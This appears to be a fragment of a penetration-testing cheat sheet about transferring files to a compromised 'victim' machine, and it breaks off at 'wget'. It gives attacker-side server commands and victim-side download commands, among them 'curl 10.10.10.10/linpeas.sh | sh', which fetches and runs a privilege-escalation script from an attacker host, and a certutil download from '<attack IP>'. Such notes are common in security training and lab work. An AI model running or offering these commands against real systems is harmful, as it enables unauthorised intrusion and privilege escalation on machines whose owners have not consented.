
HTTP 
```
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim
```
FTP
```
python -m pyftpdlib 21 #Host
ftp <ip> #Victim
```
**Windows**
Certutil
```
certutil.exe -urlcache -f http://<attack IP>/<file> <file name>
```
**Linux**
```
wget